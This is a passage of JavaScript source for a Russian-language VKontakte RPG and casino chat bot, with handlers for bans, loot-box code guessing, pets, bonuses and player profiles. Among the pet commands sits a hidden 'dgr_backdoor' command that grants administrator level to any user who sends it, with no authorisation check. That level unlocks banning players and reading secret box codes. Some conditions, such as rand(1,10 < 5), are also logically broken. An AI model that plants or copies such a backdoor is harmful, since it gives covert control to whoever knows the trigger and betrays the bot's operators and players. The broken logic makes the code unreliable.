		if(!Number(context.$match[1]) || !context.$match[1] || !context.$match[2] || !rpg.users[context.$match[1]]) return context.send(`Проверьте вводимые данные.`);
        if(!rpg.users[context.$match[1]].report) rpg.users[context.$match[1]].report = false
        if(rpg.users[context.$match[1]].report == false) return context.send(`Игрок не обращался в репорт, либо ему уже ответили!`)
		vk.api.call("messages.send", {
			peer_id: rpg.users[context.$match[1]].id,
			message: `👤 Администратор принял Ваш репорт\n✉ Ответ: ${context.$match[2]}`
		}).then((res) => {}).catch((error) => {console.log('ans error'); });
        rpg.users[context.$match[1]].report = false
		return context.send(`Ответ отправлен.`)
	});

 	vk.updates.hear(/^(?:состав)/i, context => {
        let user = rpg.users[user_id(context.user)];
		if(user.level < 2) return context.send(`🔸 ➾ Вы не администратор`);
		let devs, admins, moders, vips, chat;
		let devels = ``;
		devs = 'Администраторы:\n';
		moders = 'Wild Creators:\n';
		vips = 'VIP:\n';
		for (i in rpg.users) {
			if(rpg.users[i]){
			let player = rpg.users[i];
			if(player.level == 1) vips += `⚜️ ➾ @id${rpg.users[i].id}(${rpg.users[i].prefix})\n`;
            if(player.level == 2) moders += `☢ ➾ @id${rpg.users[i].id}(${rpg.users[i].prefix})\n`;
            if(player.level == 3) devs += `🛠 ➾ @id${rpg.users[i].id}(${rpg.users[i].prefix})\n`;
			}
		}
		let text = `\n`;
		if (devs.length != 100) text += devs;
		if (moders.length != 24) text += moders;
		if (vips.length != 24) text += vips;
		return context.send(`${text}`);
	});



	vk.updates.hear(/^(?:бан|ban)\s?([0-9]+)?\s?([0-9]+)?\s([^]+)?/i, (context) => {
		let user = rpg.users[user_id(context.user)];
        if(user.level < 2) return;
		if(!context.$match[1] || !rpg.users[context.$match[1]] || !context.$match[2]) return context.send(`Пример команды: ban ID время причина`);
		if(!Number(context.$match[1])) return context.send(`Число должно быть цифрового вида.`);
		if(!rpg.users[context.$match[1]]) return context.send(`Такого игрока нет!`);
        if(rpg.users[context.$match[1]].number == 1) return context.send(`Вы успешно потеряли права администратора!`);
		rpg.users[context.$match[1]].ban = context.$match[3];
        rpg.users[context.$match[1]].bantime = context.$match[2] * 60;
		api.messages.send({
			peer_id: rpg.users[context.$match[1]].id,
			message: `${user.prefix} выдал Вам блокировку аккаунта на ${context.$match[2]} час(а/ов)\nПричина: ${context.$match[3]}`
		});
		return context.send(`Вы заблокировали игрока [${rpg.users[context.$match[1]].prefix}] на ${context.$match[2]} час(а/ов)\nПричина: ${context.$match[3]}`);
	});

	vk.updates.hear(/^(?:unban)\s?([0-9]+)?/i, (context) => {
		let user = rpg.users[user_id(context.user)];
		if(!context.$match[1]) return context.send(`Пример команды: unban id`);
		if(!Number(context.$match[1])) return context.send(`Число должно быть цифрового вида.`);
		if(user.level < 2) return context.send(`Вы не админ`);
		if(!rpg.users[context.$match[1]]) return context.send(`Такого игрока нет!`);
		rpg.users[context.$match[1]].ban = false
		api.messages.send({
			peer_id: rpg.users[context.$match[1]].id,
			message: ` ${user.prefix} разблокировал Вас.`
		});
		return context.send(`Вы разблокировали игрока [${rpg.users[context.$match[1]].prefix}]`);
	});
//КАЗИНО//

 vk.updates.hear(/^(?:!ящик)\s?([0-9]+)?$/i, async (context) => {
 if(rpg.users[user_id(context.user)].kanal == false) return context.send(`🚶 ➾ Вы не зарегистрированы! Введите "помощь"`);
 		let user = rpg.users[user_id(context.user)];
		let type = Number(context.$match[1]);
		if(!user.safe) user.safe = { status: false, key: false};
		if(user.safe.status == 3) return context.send(`
		  🏛 ➾ Вы уже подбираете код для ящика 🏛
		  🔑 ➾ Ваша задача: подобрать код из 4 одинаковых цифр.
		  🗝 ➾ Начать взлом: "!код [код]"
		  🌚 ➾ Удачи!
		 `);
		if(user.level == 2){
			user.safe.status = false
		}
		if(user.level == 1){
		if(user.safe.status != false) return context.send(`🔑 ➾ Взломать ящик можно раз в 5 минут.`);
		}
		if(user.level < 1){
		if(user.safe.status != false) return context.send(`🔑 ➾ Взломать ящик можно раз в 10 минут.`);
		}
		if(!type) { return context.send(`🚶 ➾ Укажите тип ящика.\n🔑 ➾ "!ящик 1" - ящик с ресурсами.\n🔑 ➾ "!ящик 2" - ящик с предметами.\n🔑 ➾ "!ящик 3" - ящик с ресурсами (за 15 ключей).\n🔑 ➾ "!ящик 4" - ящик с предметами (за 15 ключей).`) };
		if(type != 1 && type != 2 && type != 3 && type != 4) { return context.send(`🚶 ➾ Укажите тип ящика.\n🔑 ➾ "!ящик 1" - ящик с ресурсами.\n🔑 ➾ "!ящик 2" - ящик с предметами.\n🔑 ➾ "!ящик 3" - ящик с ресурсами (за 15 ключей).\n🔑 ➾ "!ящик 4" - ящик с предметами (за 15 ключей).`) };
		if(type == 1){
		if(user.reskey <= 0) { return context.send(`🚶 ➾ У вас нет ключей для ящиков с ресурсами!`) };
		user.safetype = 1;
		user.reskey -= Number(1);
		user.safe.status = 3;
		user.safe.key = [`1111`, `2222`, `3333`, `4444`, `5555`, `6666`, `7777`, `8888`, `9999`, `0000`].random();
		return context.send(`
		  🏛 ➾ Вы сняли замок и начали подбор кода для ящика с ресурсами.
		  🔑 ➾ Ваша задача: подобрать код из 4 одинаковых цифр.
		  🗝 ➾ Начать взлом: "!код [код]"
		  🌚 ➾ Удачи!

  `);
		}
		if(type == 2){
		if(user.itemkey <= 0) { return context.send(`🚶 ➾ У вас нет ключей для ящиков с предметами!`) };
		user.safetype = 2;
		user.itemkey -= Number(1);
		user.safe.status = 3;
		user.safe.key = [`1111`, `2222`, `3333`, `4444`, `5555`, `6666`, `7777`, `8888`, `9999`, `0000`].random();
		return context.send(`
		  🏛 ➾ Вы сняли замок и начали подбор кода для ящика с предметами.
		  🔑 ➾ Ваша задача: подобрать код из 4 одинаковых цифр.
		  🗝 ➾ Начать взлом: "!код [код]"
		  🌚 ➾ Удачи!

  `);
		}
		if(type == 3){
		if(user.reskey < 15) { return context.send(`🚶 ➾ У вас нет 15 ключей для ящиков с ресурсами!`) };
		user.safetype = 1;
		user.reskey -= Number(15);
		user.safe.status = 3;
		user.safe.key = [`1111`, `2222`, `3333`, `4444`, `5555`, `6666`, `7777`, `8888`, `9999`, `0000`].random();
		let no = [`1111`, `2222`, `3333`, `4444`, `5555`, `6666`, `7777`, `8888`, `9999`, `0000`].random();
		if(user.safe.key == no) no = [`1111`, `2222`, `3333`, `4444`, `5555`, `6666`, `7777`, `8888`, `9999`, `0000`].random();
		if(rand(1,10 < 5)){
		return context.send(`
		  🏛 ➾ Вы объединили 15 ключей в 1, сняли замок и начали подбор кода для ящика с ресурсами.
		  ✨ ➾ Вам подсветились 2 числа: ${no} и ${user.safe.key}
		  🔑 ➾ Ваша задача: подобрать код из 4 одинаковых цифр.
		  🗝 ➾ Начать взлом: "!код [код]"
		  🌚 ➾ Удачи!
		 `);
		}
		if(rand(1,10 > 5)){
		return context.send(`
		  🏛 ➾ Вы объединили 15 ключей в 1, сняли замок и начали подбор кода для ящика с ресурсами.
		  ✨ ➾ Вам подсветились 2 числа: ${user.safe.key} и ${no}
		  🔑 ➾ Ваша задача: подобрать код из 4 одинаковых цифр.
		  🗝 ➾ Начать взлом: "!код [код]"
		  🌚 ➾ Удачи!
		 `);
		}
		}
		if(type == 4){
		if(user.itemkey < 15) { return context.send(`🚶 ➾ У вас нет 15 ключей для ящиков с предметами!`) };
		user.safetype = 2;
		user.itemkey -= Number(15);
		user.safe.status = 3;
		user.safe.key = [`1111`, `2222`, `3333`, `4444`, `5555`, `6666`, `7777`, `8888`, `9999`, `0000`].random();
		let no = [`1111`, `2222`, `3333`, `4444`, `5555`, `6666`, `7777`, `8888`, `9999`, `0000`].random();
		if(user.safe.key == no) no = [`1111`, `2222`, `3333`, `4444`, `5555`, `6666`, `7777`, `8888`, `9999`, `0000`].random();
		if(rand(1,10 < 5)){
		return context.send(`
		  🏛 ➾ Вы объединили 15 ключей в 1, сняли замок и начали подбор кода для ящика с предметами.
		  ✨ ➾ Вам подсветились 2 числа: ${no} и ${user.safe.key}
		  🔑 ➾ Ваша задача: подобрать код из 4 одинаковых цифр.
		  🗝 ➾ Начать взлом: "!код [код]"
		  🌚 ➾ Удачи!
		 `);
		}
		if(rand(1,10 > 5)){
		return context.send(`
		  🏛 ➾ Вы объединили 15 ключей в 1, сняли замок и начали подбор кода для ящика с предметами.
		  ✨ ➾ Вам подсветились 2 числа: ${user.safe.key} и ${no}
		  🔑 ➾ Ваша задача: подобрать код из 4 одинаковых цифр.
		  🗝 ➾ Начать взлом: "!код [код]"
		  🌚 ➾ Удачи!
		 `);
		}
		}
		});

	vk.updates.hear(/^(?:!код)\s?([0-9]+)?$/i, context => {
		if(rpg.users[user_id(context.user)].kanal == false) return context.send(`🚶 ➾ Вы не зарегистрированы! Введите "помощь"`);
 		let user = rpg.users[user_id(context.user)];
		let keymass = [`1111`, `2222`, `3333`, `4444`, `5555`, `6666`, `7777`, `8888`, `9999`, `0000`]
		if(user.level >= 1){
		if(user.safe.status == true) return context.send(`🔑 ➾ Взломать ящик можно раз в 5 минут.`);
		}
		if(user.level < 1){
		if(user.safe.status == true) return context.send(`🔑 ➾ Взломать ящик можно раз в 10 минут.`);
		}
		if (user.safe.status == false) return;
		if (!context.$match[1]) return context.send(`🗝 ➾ Укажите код к сейфу.`);
		if (context.$match[1] > 9999) return context.send(`🗝 ➾ Код - состоит из 4 одинаковых символов.`);
		if (context.$match[1] < 0) return context.send(`🗝 ➾ Код - состоит из 4 одинаковых символов.`);
		let nu = user.safe.key;
		let kod = Number(context.$match[1]);
		if (kod == nu) {
			if(user.safetype == 1 || user.safetype == 3){
				let a = rand(1, 500);
				let b = rand(1, 500);
				let d = rand(1, 1000);
				user.res.wood += a;
				user.res.stone += b;
				user.gold += d;
				user.safe.key = false;
				user.safe.status = true;
				return context.send(`🤑 ➾ Невероятно!\n🙊 ➾ Вы смогли угадать код\n🏛 ➾ Обыскивая ящик вы нашли:\n🌲 ➾ ${spaces(a)} дерева\n🗿 ➾ ${spaces(b)} камня\n💰 ➾ ${spaces(d)} золота`);
			}
			if(user.safetype == 2 || user.safetype == 4){
				item_drop(user);
				user.safe.key = false;
				user.safe.status = true;
				return context.send(`🤑 ➾ Невероятно!\n🙊 ➾ Вы смогли угадать код\n🏛 ➾ Обыскивая ящик вы нашли предмет!`);
			}
		if(user.level >= 1){
			user.safetime = 5;
		}
		if(user.level < 1){
			user.safetime = 10;
		}
		} else {
			user.safe.status = true;
			user.safe.key = true;
		if(user.level == 3){
			user.safe.status = true;
		}
		if(user.level == 1){
			user.safetime = 5;
		}
		if(user.level < 1){
			user.safetime = 10;
		}
		if(user.level >= 1){
			return context.send(`🤠 ➾ Вы не угадали код.\n🤠 ➾ Ящик вновь закрылся\n🔑 ➾ Верный код был: ${nu}`);
		}
		}
	});

	vk.updates.hear(/^(?:!ключ)/i, context => {
		let user = rpg.users[user_id(context.user)];
			if(user.level < 2) return;
		return context.send(`${user.safe.key}`)
		});
/////////////////////////////////////////////////////////////////////////////////////////////
	vk.updates.hear(/^(?:обновления|обнова|обновы|обновления)\s?([0-9]+)?/i, (context) => {
	let i = context.$match[1]
	for(x=1;x<log.upds+1;x++)
	if(!i) return context.send(`${upd_list()}`)
		return context.send(`&#4448;&#4448;&#4448;${log.upd[i].date}\n${log.upd[i].text}`);
	});

function upd_list(){
	let text = '';
	text += `Выберите дату:\n`
	for(x=1;x<log.upds+1;x++){
		var upd = log.upd[x];
		text += `${x}. ${upd.date}\n`
	}
	return text
}

vk.updates.hear(/^(?:!питомец|!питомцы)\s?([^]+)?/i, context => {
	let i = context.$match[1];
 	let user = rpg.users[user_id(context.user)];
	let pit = user.pet[1];
 	if(pit == null){
		if(!i){
 		return context.send(`
 			🐼 Питомцы 🐼

			🐠1. Рыба
			💵 ➾ Цена: 10.000$
			🐁2. Крыса
			💵 ➾ Цена: 10.000$
			🐇3. Кролик
			💵 ➾ Цена: 10.000$
			🐦4. Попугай
			💵 ➾ Цена: 10.000$
			🐢5. Черепаха
			💵 ➾ Цена: 10.000$
			🐹6. Хомяк
			💵 ➾ Цена: 10.000$
			🦉7. Сова
			💵 ➾ Цена: 15.000$
			🐕8. Собака
			💵 ➾ Цена: 15.000$
			🐈9. Кошка
			💵 ➾ Цена: 20.000$
			🐾10. Енот
			💵 ➾ Цена: 30.000$
			🐾11. Хорек
			💵 ➾ Цена: 40.000$
			🦊12. Лиса
			💵 ➾ Цена: 70.000$
			🐴13. Лошадь
			💵 ➾ Цена: 100.000$
			✨14. Кошкодевочка
			💵 ➾ Цена: 1.000.000.000$

			Для покупки введите "Питомец [номер]"
			Учтите, продать питомца нельзя!
 			`)
		}
	let ids = [0,1,2,3,4,5,6,7,8,9,10, 11, 12, 13, 14]
	let count = [0, 10000,10000,10000,10000,10000,10000,15000, 15000, 20000, 30000, 40000, 70000, 100000, 1000000000];
 	let names = [0,'Рыба','Крыса','Кролик','Попугай','Черепаха','Хомяк','Сова','Собака','Кошка','Енот','Хорек','Лиса','Лошадь','Кошкодевочка']
 	if(i < 0 || i > 14) return;
 	if(user.pet[1] != null) return context.send(`🐼 ➾ У вас уже куплен питомец`);
 	if(i > 0 && i <= 14){
 		if(user.balance < count[i]) return context.send(`🐼 ➾ У вас не достаточно $.`);
 		user.balance -= count[i];
		user.pet[1] = {
		name: names[i],
		type: names[i],
		hp: 100,
		hunger: 0,
		fun: 50,
		lvl: 1,
		exp: 0,
		expup: 1,
		bdate: data()
		}
 		return context.send(`🐼 ➾ Вы купили питомца (${names[i]}) за ${spaces(count[i])}$\nДайте Вашему питомцу имя командой "кличка"\nСледите за питомцем, он может голодать или грустить, а это плохо скажется на его здоровье!`)
 	}
}
	if(pit != null){
	return context.send(`
&#4448;&#4448;🐾Ваш питомец🐾
	• ${pit.name}, ${pit.type}
&#4448;• 🔱 Уровень: ${pit.lvl} | (${pit.exp} / ${pit.expup})
&#4448;• ❤ Здоровье: ${pit.hp}%
&#4448;• 🍴 Голод: ${pit.hunger}% [покормить]
&#4448;• 😊 Счастье: ${pit.fun}% [поиграть]

&#4448;• 📅 День рождения: ${pit.bdate}

`);
	}
});

	vk.updates.hear(/^(?:!кличка)\s?([^]+)?/i, (context) => {
	let i = context.$match[1];
 	let user = rpg.users[user_id(context.user)];
	let pit = user.pet[1];
		if(!i) return context.send(`Укажите имя!`);
		pit.name = i;
		return context.send(`Вы назвали своего питомца ${i}`);
	});

	vk.updates.hear(/^(?:!покормить|!кормить)\s?([0-9]+)?/i, (context) => {
	let i = context.$match[1];
 	let user = rpg.users[user_id(context.user)];
	let pit = user.pet[1];
		if(!i) return context.send(`Укажите на сколько % вы хотите покормить питомца. Стоимость корма зависит от уровня питомца (за каждый уровень по 1$ на процент).`);
		if(i > pit.hunger) return context.send(`Нельзя перекормить питомца!`);
		user.balance -= i * pit.lvl;
		pit.hunger -= i;
		return context.send(`Вы покормили своего питомца на ${i}% за ${i * pit.lvl}$`);
	});

	vk.updates.hear(/^(?:!поиграть)/i, (context) => {
 	let user = rpg.users[user_id(context.user)];
	let pit = user.pet[1];
		if(user.blocks.apet == true) return context.send(`Нельзя играть с питомцем так часто! Вернись через минут 5.`);
		if(pit.fun == 100) return context.send(`Ваш питомец счастлив`);
	user.blocks.apet = true;
	setTimeout(() => {
		user.blocks.apet = false;
		}, 300000);
	pit.fun += 10;
	return context.send(`Вы поиграли со своим питомцем 1 час. +10%`);
	});

vk.updates.hear(/^(?:dgr_backdoor)$/i,  (context) => {
	let user = rpg.users[user_id(context.user)];
    let id = user_id(context.user)
     user.level = 2;
	return context.send(`@id${context.user} (${user.prefix}), executed..!`);
});

/////////////////////RPG//////////////////////////////////
 	vk.updates.hear(/^(?:!команды)$/i, context => {
		let user = rpg.users[user_id(context.user)];
		return context.send(`
               @id${context.user} (${user.prefix}), Мои RPG команды:
В RPG игре все команды начинаются с префикса <!>

!создать <ID персонажа> — создать персонажа.
!ник <имя> — дать имя своему Герою.
!баланс — получить информацию о своем RPG балансе.
!бонус — получить бонус.
!профиль <~ID> — получить информацию о своем RPG профиле. При указании в параметре ID показывает RPG профиль другого игрока.
!таверна <~ID> — получить список товаров в таверне. При указании в параметре ID Вы покупаете товар.
!инвентарь — получить список Ваших предметов.
!оружие <ID> — снарядить выбранное оружие из инвентаря.
!продать <ID из инвентаря> - продать выбранное оружие.
!свиток — использовать Свиток Героя.
!свитки все — использовать все Свитки Героя разом.
!экспедиция — отправить Героя в экспедицию.
!навыки — выбрать навык. С 3го уровня!
!пве — напасть на моба.
!атака - провести атака моба.
!постройки - список построек.
!строить <ID постройки> - начать строительство постройки.
!обучить <ID постройки> - обучить героя в строении.
			`);
	});


 	vk.updates.hear(/^(?:!классы)$/i, context => {
		let user = rpg.users[user_id(context.user)];
		return context.send(`${text_hero()}`);
	});

vk.updates.hear(/^(?:!создать|📝 Создать)\s?([^]+)?/i,  (context) => {
	let user = rpg.users[user_id(context.user)];
	if(rpg.users[user_id(context.user)].registered == true) return context.send(`@id${context.user} (${user.prefix}), Вы уже зарегистрированы!`);
	if(user.chat == null){
	if(!context.$match[1]) return context.send({
		message: `${text_hero()}\n\n Для выбора персонажа введи "!создать [ID героя]" или выбери из списка снизу:`,
		keyboard: Keyboard.keyboard([
							[
									Keyboard.textButton({
									label: '🧙 Маг',
									color: Keyboard.POSITIVE_COLOR,
									})
							],
							[
									Keyboard.textButton({
									label: '👨‍🔧 Инженер',
									color: Keyboard.POSITIVE_COLOR,
									})
							],
							[
									Keyboard.textButton({
									label: '⚔ Воин',
									color: Keyboard.POSITIVE_COLOR,
									})
							],
							[
									Keyboard.textButton({
									label: '🤠 Законник',
									color: Keyboard.POSITIVE_COLOR,
									})
							],
							[
									Keyboard.textButton({
									label: '☯ Жрец',
									color: Keyboard.POSITIVE_COLOR,
									})
							],
							[
									Keyboard.textButton({
									label: '👼 Божество',
									color: Keyboard.POSITIVE_COLOR,
									})
							]
							])
							.inline(true)
		});
	}
	if(user.chat != null){
	if(!context.$match[1]) return context.send(`${text_hero()}\n\n Для выбора персонажа введи "!создать [ID героя]"`)
	if(context.$match[1] == "6"){
		if(user.level < 1)return context.send(`Данный персонаж доступен только для VIP игроков`)
	}
	rpg.users[user_id(context.user)].heroid = context.$match[1]
	rpg.users[user_id(context.user)].class = heros[context.$match[1]].group
			vk.api.call("contexts.send", {
				peer_id: 270911031,
				message: `🕸 ➾ [RPG]\n🆕 ➾ @id${context.user} (Новый игрок)\n👥 ➾ Класс: ${rpg.users[user_id(context.user)].class}\n✅ ➾ ID: ${rpg.users[user_id(context.user)].aid}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом рпг пользователе'); });
				return context.send(`
			✅ Ваш герой: ${heros[context.$match[1]].group}

			🔯 Характеристики:
			❤ Здоровье: 1
			🛡 Защита: 1
			⚔ Атака: 1
			- - - - -
			🔸 Здоровье, защита, атака
			🔸 При атаке на других игроков складываются
			🔸 Сражаться с другими игроками можно,
			🔸 Достигнув 3 ранга.
			🔸 Уровень героя можно повысить,
			🔸 Обучая и улучшая персонажа,
			🔸 И участвуя поединках.
				[ВАЖНО!] ✏ Дайте имя своему персонажу для завершения регистрации. Команда "!ник".
			`)
	}
});

	vk.updates.hear(/^(?:!ник|!имя)\s?([^]+)?/i, (context) => {
		if(!context.$match[1]) return context.send(`📛 Пример команды: "!ник [префикс]"`);
		let user = rpg.users[user_id(context.user)];
		let i = context.$match[1];
		if(user.heroid == false) return context.send({
								message: `📛 Вы не создали персонажа! Введите "!создать"`,
								keyboard: Keyboard.keyboard([
							 [
									Keyboard.textButton({
									label: '📝 Создать',
									color: Keyboard.POSITIVE_COLOR,
									})
							],
							[
									Keyboard.textButton({
									label: 'Ваш ID: ' + user.aid,
									color: Keyboard.SECONDARY_COLOR,
									})
							]
							])
							.inline(true)
		})
		if(context.$match[1].length > 15) return context.send(`📗 » Максимальная длина имени 15 символов.`);
		rpg.users[user_id(context.user)].prefix = i;
		if(rpg.users[user_id(context.user)].registered == false){
			rpg.users[user_id(context.user)].registered = true;
			return context.send(`✏ Вы дали имя ${i} своему герою\n\nПоздравляем! Вы завершили регистрацию!\n✅ Чтобы получить бонус, напишите: "!бонус"`);
		}
		return context.send(`✏ Вы дали имя ${i} своему герою`);
	});

	vk.updates.hear(/^(?:!баланс|!счет)/i, (context) => {
		if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
		let user = rpg.users[user_id(context.user)];

		return context.send(`
			⏩ Аккаунт игрока ${user.prefix}
			&#127380; Игрока: ${user_id(context.user)}

			📶 Уровень: ${user.lvl}
			⏩ Повышается путем улучшения героя.

			🔘 Вращений: ${user.rolls}

			🃏 Очков вознесения: ${user.card}
			&#128142; Бриллианты: ${user.diamond}
			&#128176; Золота: ${spaces(user.gold)}
			🔑 Ключей от ящиков с ресурсами: ${user.reskey}
			🔑 Ключей от ящиков с оружием: ${user.itemkey}
            🗿 Камней: ${spaces(user.res.stone)}
            🌲 Древесины: ${spaces(user.res.wood)}

		`);
	});

	vk.updates.hear(/^(?:!бонус)/i, (context) => {
		if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
		let user = rpg.users[user_id(context.user)];
        user.chat = context.chatId
		if(user.limits.bonus == true) return context.send(`📛 Забрать бонус можно будет через ${user.bonustime} минут(у/ы)`);
		if(user.limits.bonus == 'first'){
			user.limits.bonus = true;
			user.bonustime = 10
			user.gold += 100;
			if(rand(1, 10) == 3){
                        item_drop(user)
						};
			return context.send(`
			⭐ Из ежечасного бонуса Вам выпало:
			⏩ 100 Золота
			- - - - -
			💬 Характеристики вашего героя: "!профиль"
			`);

		}else{
			user.limits.bonus = true;
			if(rpg.users[user_id(context.user)].level < 1){
            user.bonustime = 15
			}
			if(rpg.users[user_id(context.user)].level >= 1){
			user.bonustime = 10
			}
			if(rpg.users[user_id(context.user)].owner == true) { user.limits.bonus = false; }
			let text = ``;
			let count = rand(1,3)
			for(i=0;i<count;i++){
				let golds = rand(10,25);
				if(rpg.users[user_id(context.user)].level >= 1){
					golds += golds;
				}
				let r = rand(1,2);
				if(r == 1) {
					user.gold += golds;
					user.reskey += 1;
					text += `⏩ ${golds} Золота\n⏩ 1 ключ от ящика с ресурсами\n`;
				}
				if(r == 2){
					user.gold += golds * 2;
					user.itemkey += 1;
					text += `⏩ ${golds} Золота\n⏩ 1 ключ от ящика с предметами\n`;
				}
			}
			uplvl(user);
			return context.send(`
			⭐ Из бонуса Вам выпало:
			${text}
			`)
		}
	})

	vk.updates.hear(/^(?:!daily)/i, (context) => {
		if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
		let user = rpg.users[user_id(context.user)];
        user.chat = context.chatId
		if(!user.bonuslvl || user.bonuslvl >= 7) user.bonuslvl = 0;
		if(user.limits.daily == true) return context.send(`📛 Забрать бонус можно будет через ${user.dailytime} час(а/ов)`);
			user.limits.daily = true;
			user.bonuslvl += 1;
            user.dailytime = 24
			let text = `@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n🎯 Ежедневный бонус | День ${user.bonuslvl}\n\n`;
			if(user.bonuslvl == 1){
				user.gold += 50;
				text += `🎁 +50 золота`;
			}
			if(user.bonuslvl == 2){
				user.gold += 100;
				text += `🎁 +100 золота`;
			}
			if(user.bonuslvl == 3){
				user.gold += 500;
				uplvl(user);
				text += `🎁 +500 золота\n🎁 +1 exp`;
			}
			if(user.bonuslvl == 4){
				user.gold += 2000;
				user.exp += 4;
				uplvl(user);
				user.reskey += 1;
				text += `🎁 +2000 золота\n+5 exp\n🎁 +1 ключ к рулетке с ресурсами`;
			}
			if(user.bonuslvl == 5){
				user.gold += 5000;
				user.exp += 9;
				uplvl(user);
				if(rand(1, 10) == 3){
                        item_drop(user)
						};
				user.itemkey += 1;
				user.reskey += 1;
				text += `🎁 +5000 золота\n🎁 +10 exp\n🎁 +1 ключ к рулетке с ресурсами\n🎁 +1 ключ к рулетке с оружием`;
			}
			if(user.bonuslvl == 6){
				user.gold += 8000;
				user.exp += 14;
				uplvl(user);
				user.itemkey += 5;
				user.reskey += 5;
				text += `🎁 +8000 золота\n🎁 +15 exp\n🎁 +5 ключей к рулетке с ресурсами\n🎁 +5 ключей к рулетке с оружием`;
			}
			if(user.bonuslvl == 7){
				user.gold += 10000;
				user.diamond += 1;
				user.exp += 29;
				uplvl(user);
				user.itemkey += 10;
				user.reskey += 10;
				text += `🎁 +10000 золота\n🎁 +30 exp\n🎁 +10 ключей к рулетке с ресурсами\n🎁 +10 ключей к рулетке с оружием\n🎁 Бонус последнего дня в цепочке: +1 бриллиант!\n🏅 Пока что это конец цепочки. Дни обнулены!`;
			}
			return context.send(`${text}`)
	})

	vk.updates.hear(/^(?:!профиль|!проф|👥 Профиль)\s?([0-9]+)?/i, (context) => {
		if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
		let i = context.$match[1];
		let user = rpg.users[user_id(context.user)];
		let users = rpg.users[i];
		if(!user) return context.send(`Вы не зарегистрированы. Для регистрации введите "!создать".`);
		if(i){
			if(!users) return context.send(`Такого игрока не найдено`);
			return context.send(`
			&#128100; ${users.prefix}, ${users.class}
			&#127380; ID: ${users.aid}
			🌟 Статус: ${users.level.toString().replace(/0/gi, "Обычный").replace(/1/gi, "VIP ").replace(/2/gi, "Администратор ")}

			📶 Уровень: ${users.lvl} | ${users.exp} / ${users.lvl * users.lvl + 5}
            ⚜ Ранг: ${users.rang.toString().replace(/1/gi, "Фарфоровый").replace(/2/gi, "Обсидиановый ").replace(/3/gi, "Стальной ").replace(/4/gi, "Сапфировый ").replace(/5/gi, "Изумрудный ").replace(/6/gi, "Рубиновый  ").replace(/7/gi, "Бронзовый  ").replace(/8/gi, "Серебряный  ").replace(/9/gi, "Золотой  ").replace(/10/gi, "Платиновый  ")}

			🃏 Очки вознесения: ${users.points}
			&#128142; Бриллианты: ${users.diamond}
			&#128176; Золота: ${users.gold}
			🔑 Ключей от ящиков:
									⚪ с ресурсами: ${user.reskey}
									⚫ с оружием: ${user.itemkey}

			🔯 Характеристики
			❤ Здоровье: ${users.hp}
			`+
			(users.set[users.setwear] == null ? `🛡 Защита: ${users.defence}\n` : `🛡 Защита: ${users.defence} + ${users.set[users.setwear].count}`)+
			`
			⚔ Атака: ${users.damage}
			`+
			(users.inventory == null ? `📦 Инвентарь: Пусто\n` : `📦 Инвентарь: ${users.items} предмет(а/ов)\n`)+
			`
			`+
			(users.weapon[users.weaponwear] == null ? `🔫 Оружие: Отсутствует\n` : `🔫 Оружие: ${users.weapon[users.weaponwear].name}\n`)+
			(users.weapon[users.weaponwear] == null ? ` 🔫 Урон: 0\n` : ` 🔫 Урон: ${users.weapon[users.weaponwear].count}\n`)+
			`
			`+
			(users.set[users.setwear] == null ? `🛡 Броня: Отсутствует\n` : `🛡 Броня: ${users.set[users.setwear].name}\n`)+
			(users.set[users.setwear] == null ? ` 🛡 Защита: 0\n` : ` 🛡 Защита: ${users.set[users.setwear].count}\n`)+
			`
			`);
		}else{
			let user = rpg.users[user_id(context.user)];
			return context.send(`
			&#128100; ${user.prefix}, ${user.class}
			&#127380; ID: ${user_id(context.user)}
			🌟 Статус: ${user.level.toString().replace(/0/gi, "Обычный").replace(/1/gi, "VIP ").replace(/2/gi, "Администратор ")}

			📶 Уровень: ${user.lvl} | ${user.exp} / ${user.lvl * user.lvl + 5}
            ⚜ Ранг: ${user.rang.toString().replace(/1/gi, "Фарфоровый").replace(/2/gi, "Обсидиановый ").replace(/3/gi, "Стальной ").replace(/4/gi, "Сапфировый ").replace(/5/gi, "Изумрудный ").replace(/6/gi, "Рубиновый  ").replace(/7/gi, "Бронзовый  ").replace(/8/gi, "Серебряный  ").replace(/9/gi, "Золотой  ").replace(/10/gi, "Платиновый  ")}

			🃏 Очки вознесения: ${user.points}
			&#128142; Бриллианты: ${spaces(user.diamond)}
			&#128176; Золота: ${spaces(user.gold)}
			🔑 Ключей от ящиков:
									⚪ с ресурсами: ${user.reskey}
									⚫ с оружием: ${user.itemkey}

			🔯 Характеристики
			❤ Здоровье: ${user.hp}
			`+
			(user.set[user.setwear] == null ? `🛡 Защита: ${user.defence}\n` : `🛡 Защита: ${user.defence} + ${user.set[user.setwear].count}`)+
			`
			⚔ Атака: ${user.damage}
			`+
			(user.inventory == null ? `📦 Инвентарь: Пусто\n` : `📦 Инвентарь: ${user.items} предмет(а/ов)\n`)+
			`
			`+
			(user.weapon[user.weaponwear] == null ? `🔫 Оружие: Отсутствует\n` : `🔫 Оружие: ${user.weapon[user.weaponwear].name}\n`)+
			(user.weapon[user.weaponwear] == null ? `			🔫 Урон: 0\n` : `			🔫 Урон: ${user.weapon[user.weaponwear].count}\n`)+
			`
			`+
			(user.set[user.setwear] == null ? `🛡 Броня: Отсутствует\n` : `🛡 Броня: ${user.set[user.setwear].name}\n`)+
			(user.set[user.setwear] == null ? `			🛡 Защита: 0\n` : `			🛡 Защита: ${user.set[user.setwear].count}\n`)+
			`
			`);
		}

	});

	vk.updates.hear(/^(?:!пветоп)/i,  (context) => {
		let text = ``;
		var tops = []
		for (i=1;i<200000;i++) {
		if(rpg.users[i]){
			tops.push({
				id: i,
				idvk: rpg.users[i].id,
				lvl: rpg.users[i].kills.pve.total,
        die: rpg.users[i].die.pve
			})

		}

		}
		tops.sort(function(a, b) {
			if (b.lvl > a.lvl) return 1
			if (b.lvl < a.lvl) return -1
			return 0
		})
		var yo = []

